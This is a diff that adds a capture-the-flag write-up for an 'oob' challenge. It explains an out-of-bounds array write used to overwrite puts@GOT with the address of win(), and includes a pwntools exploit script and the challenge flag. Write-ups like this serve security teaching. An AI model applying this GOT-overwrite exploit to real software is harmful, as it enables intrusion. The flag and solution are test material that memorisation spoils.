@@ -159,6 +159,35 @@ r.interactive()
 
 `flag: accessdenied{ret2l1bc_15_r34lly_4m4z1ng_3xpl0_75723a21}`
 
+## oob
+
+### Files
+
+[Download Files](https://github.com/nomnom-CTF/website/raw/gh-pages/accessdenied-2022/files/oob.zip)
+
+### Description
+
+We are given a program which lets us write any value of our choice into any index that we choose (array index).
+
+### Solution
+
+It's clear that we can overwrite any value in the memory using that array out of bounds access. The program uses `puts()` to print out "good boy" at the end, so we can just overwrite the address `puts@GOT` is pointing at with the address of `win()`. To calculate how far away the `win()` function is from `array`, we need to take into account that `array` is an integer array so that means that the distance between each index is 4 bytes, hence in our final calculation we divide by 4. The following script does exactly what was just described and retrieves the flag:
+
+```python
+from pwn import *
+
+r = process('./oob')
+elf = context.binary = ELF('./oob')
+
+r.sendline(str((elf.got['puts'] - elf.sym['arr'])//4))
+
+r.sendlineafter(b'value: ', str(elf.sym['win']))
+
+r.interactive()
+```
+
+`flag: accessdenied{00b_4r3_v3ry_us3ful_r1ght_54a4ce45}`
+
 # Reverse Engineering
 
 ## babyrev
